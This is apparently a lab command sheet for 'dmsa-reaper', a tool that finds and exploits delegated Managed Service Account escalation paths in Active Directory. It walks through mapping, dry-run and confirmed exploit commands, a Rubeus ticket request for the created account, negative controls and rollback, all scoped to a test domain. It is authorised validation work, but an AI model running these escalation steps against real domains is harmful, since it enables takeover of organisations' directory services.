# Lab Command Sheet — dmsalab.local

Validation lab defined in `dmsa-reaper-adbuilder-lab.json`.
Domain: `dmsalab.local` | DC: `DC01.dmsalab.local`

Replace `<DC_IP>` and `<PASSWORD>` with the actual DC IP and operator password.
The `--confirm-string dmsalab.local` flag is required by the scope file.

## Prerequisites

```bash
# Install and verify
pip install -e ".[dev]"
pytest -q

# Add-KdsRootKey must have run on the DC before mapping:
# PowerShell (on DC): Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))
```

## Offline Fixture Smoke Test (no live DC required)

Verify the path classifier against the pre-built fixture before touching a live lab.

```bash
dmsa-reaper map --offline-fixture docs/lab-fixture-dmsalab.json --json state-fixture.json

dmsa-reaper paths --state state-fixture.json --expand-targets --json paths-fixture.json
```

Expected in `paths-fixture.json`:
- `postpatch-mutual-pair`: DMSA-Direct × victim.postpatch, DMSA-Direct × victim.primary,
  DMSA-Legacy × victim.postpatch, DMSA-Legacy × victim.primary,
  DMSA-PrimaryGroup × victim.postpatch, DMSA-PrimaryGroup × victim.primary
- `legacy-oneway-link`: 15 paths (3 containers × 5 targets)
- NO path from `OU=DMSA-GenericWriteOnly` (GenericWrite does not imply CreateChild)
- NO `dacl-container-escalate` for reaper.low (they lack WriteDACL on any container)

---

## Scenario 1: Direct postpatch path (reaper.low → DMSA-Direct → victim.postpatch)

### Step 1 — Map

```bash
dmsa-reaper map \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.low -p '<PASSWORD>' \
  --use-ldaps \
  --json state-direct.json

# Verify: dmsa_capable_status=present, server_2025_dc_status=present, kds_root_key_status=present
```

### Step 2 — Paths

```bash
dmsa-reaper paths \
  --state state-direct.json \
  --expand-targets \
  --json paths-direct.json

# Verify: postpatch-mutual-pair appears with
#   container_dn = OU=DMSA-Direct,OU=Lab,DC=dmsalab,DC=local
#   target_dn    = CN=victim.postpatch,OU=Targets,OU=Lab,DC=dmsalab,DC=local
```

### Step 3 — Dry run

```bash
POSTPATCH_PATH_ID=$(python3 -c "
import json
paths = json.load(open('paths-direct.json'))
hit = next((p for p in paths
            if p['primitive'] == 'postpatch-mutual-pair'
            and 'DMSA-Direct' in (p.get('container_dn') or '')
            and 'victim.postpatch' in (p.get('target_dn') or '')), None)
print(hit['id'] if hit else 'NOT FOUND')
")
echo "Path ID: $POSTPATCH_PATH_ID"

dmsa-reaper exploit \
  --paths paths-direct.json \
  --state state-direct.json \
  --path "$POSTPATCH_PATH_ID" \
  --scope docs/lab-scope-dmsalab.json \
  --domain dmsalab.local \
  --dry-run
```

### Step 4 — Exploit (confirm)

```bash
dmsa-reaper exploit \
  --paths paths-direct.json \
  --state state-direct.json \
  --path "$POSTPATCH_PATH_ID" \
  --scope docs/lab-scope-dmsalab.json \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.low -p '<PASSWORD>' \
  --confirm-string dmsalab.local \
  --confirm \
  --ops-dir .reaper/lab-runs/direct

# Record: operation ID (OP-YYYYMMDD-xxxxxxxx)
DIRECT_OP_ID=OP-YYYYMMDD-xxxxxxxx
```

### Step 5 — LDAP verify

```bash
dmsa-reaper verify \
  --op "$DIRECT_OP_ID" \
  --mode ldap \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.low -p '<PASSWORD>' \
  --ops-dir .reaper/lab-runs/direct

# Output must include:
# "LDAP-state verification does not prove Kerberos ticket issuance."
```

### Step 6 — External Kerberos proof recording

Run approved Kerberos validation externally, then record only structured proof.
Do not store raw tickets, hashes, private keys, or base64 ticket blobs in the
operation log.

Example evidence file:

```json
{
  "type": "kerberos-dmsa-proof",
  "operation_id": "OP-YYYYMMDD-xxxxxxxx",
  "target_sam": "victim.postpatch",
  "created_dmsa_sam": "dmsarpr-abc123$",
  "domain": "dmsalab.local",
  "realm": "DMSALAB.LOCAL",
  "tool": "external",
  "tool_version": "1.0",
  "result": "success",
  "evidence": {
    "principal": "dmsarpr-abc123$@DMSALAB.LOCAL",
    "service": "cifs/dc01.dmsalab.local@DMSALAB.LOCAL",
    "timestamp": "2026-06-02T10:00:00Z"
  }
}
```

Base Kerberos readiness proof is separate and never marks a dMSA operation as
externally verified:

```json
{
  "type": "kerberos-base-proof",
  "operation_id": null,
  "principal": "reaper.low@DMSALAB.LOCAL",
  "service": "cifs/DMSA.dmsalab.local@DMSALAB.LOCAL",
  "tool": "smbclient.py",
  "result": "success",
  "notes": "SYSVOL listed successfully"
}
```

Record it:

```bash
dmsa-reaper verify \
  --op "$DIRECT_OP_ID" \
  --mode external \
  --evidence-file proof.json \
  --ops-dir .reaper/lab-runs/direct
```

Optional lab-only command adapter dry-run:

```bash
dmsa-reaper verify \
  --op "$DIRECT_OP_ID" \
  --mode external \
  --kerberos-adapter external \
  --adapter-command 'python3 emit-proof.py {operation_id}' \
  --adapter-dry-run \
  --ops-dir .reaper/lab-runs/direct
```

Adapter execution requires `--lab-unsafe-kerberos-proof`, `--scope`, and
`--confirm-string`; the adapter must emit the same structured JSON proof on
stdout. No adapter runs by default.

Example external validation command, to be run separately on a Windows host with
access to the DC on port 88:

```powershell
# Replace <DMSA_SAM> with the sAMAccountName from exploit output (e.g. dmsarpr-abc12345$)
Rubeus.exe asktgt /user:<DMSA_SAM> /domain:dmsalab.local /dc:<DC_IP> /nowrap
```

### Step 7 — Rollback

```bash
dmsa-reaper rollback \
  --op "$DIRECT_OP_ID" \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.low -p '<PASSWORD>' \
  --ops-dir .reaper/lab-runs/direct
```

### Step 8 — Verify rollback

```bash
dmsa-reaper verify \
  --op "$DIRECT_OP_ID" \
  --mode ldap \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.low -p '<PASSWORD>' \
  --ops-dir .reaper/lab-runs/direct
# Expected: verified=false (writes have been reversed)
```

---

## Scenario 2: PrimaryGroupID path (reaper.primary via Domain Users → DMSA-PrimaryGroup → victim.primary)

Same sequence as Scenario 1 with:
- `-u reaper.primary`
- Expect path from `OU=DMSA-PrimaryGroup` to `CN=victim.primary`

This validates that rights granted to Domain Users (via `primaryGroupID`) are detected.

---

## Scenario 3: Nested group path (reaper.nested → DMSA-Nested → victim.nested)

```bash
dmsa-reaper map \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.nested -p '<PASSWORD>' \
  --use-ldaps \
  --json state-nested.json

dmsa-reaper paths --state state-nested.json --expand-targets --json paths-nested.json
# Verify: postpatch-mutual-pair from OU=DMSA-Nested to CN=victim.nested
```

---

## Scenario 4: Negative controls

### GenericWrite does not create a postpatch path

```bash
dmsa-reaper map \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.genericwrite -p '<PASSWORD>' \
  --json state-genericwrite.json

dmsa-reaper paths --state state-genericwrite.json --expand-targets
# Expected: NO postpatch-mutual-pair or legacy-oneway-link path
# GenericWrite on a container DOES NOT imply CreateChild
```

### No-rights user produces no paths

```bash
dmsa-reaper map \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.norights -p '<PASSWORD>' \
  --json state-norights.json

dmsa-reaper paths --state state-norights.json --expand-targets
# Expected: no paths
```

---

## Scenario 5: DACL-only path (reaper.dacl — non-executable without --lab-unsafe)

```bash
dmsa-reaper map \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.dacl -p '<PASSWORD>' \
  --json state-dacl.json

dmsa-reaper paths --state state-dacl.json --expand-targets
# Expected: dacl-container-escalate and/or dacl-target-escalate paths
# These require --lab-unsafe + scope.allowDaclPrimitives=true to execute

# Verify the path is classified as executable=true but requires lab flags:
# dacl-container-escalate on OU=DMSA-DACL-Only
# dacl-target-escalate on CN=victim.dacl
```

---

## Scenario 6: Existing-dMSA path (reaper.existing)

```bash
# Step 1: create a dMSA manually in CN=Managed Service Accounts
# (requires domain admin or CreateChild on CN=Managed Service Accounts)
# Note the DN, e.g. CN=test-dmsa-1$,CN=Managed Service Accounts,DC=dmsalab,DC=local
# Grant reaper.existing GenericAll/GenericWrite or both migration attrs on this dMSA.

dmsa-reaper map \
  --domain dmsalab.local --dc-ip <DC_IP> \
  -u reaper.existing -p '<PASSWORD>' \
  --json state-existing.json

dmsa-reaper paths --state state-existing.json --expand-targets
# Expected: existing-dmsa-postpatch-mutual path if both migration attrs are writable
# Expected: NO path if only KeyCredentialLink or GroupMSAMembership is writable
```

---

## ACL Prediction Validation

After setting up and tearing down ACEs, run the map after each change and verify:

| Step | Action | Expected map result |
|---|---|---|
| Grant CreateChild:dMSA to test principal | `Set-Acl` or AD delegation wizard | `CreateChild` appears in container rights |
| Remove the grant | Remove ACE | Right disappears from map output |
| Add DENY CreateChild | Add explicit deny | Right absent even if allow ACE exists |
| Grant via nested group (Reaper-Nested-L2) | Already configured | `reaper.nested` sees CreateChild via nested group expansion |
| Grant WriteDACL without CreateChild | `Reaper-DACL-Only` on `DMSA-DACL-Only` | `dacl-container-escalate` path, no direct postpatch path |

---

## Evidence to Collect

Per the lab-validation-checklist.json, record:

| Item | Evidence |
|---|---|
| DC OS version | From map output `dcs` list |
| KDS root key | `kds_root_key_status=present` in state.json |
| Direct path | paths.json P-XXXX, container DN, target DN |
| Dry-run | Planned steps output |
| Exploit | Operation ID, created dMSA DN, sAMAccountName |
| LDAP verify | `verified=true`, LDAP disclaimer text |
| External Kerberos | Tool name, argv, exit code, stdout SHA-256 |
| Rollback | Operation ID, `status=rolled-back` |
| Rollback verify | `verified=false` confirming writes reversed |
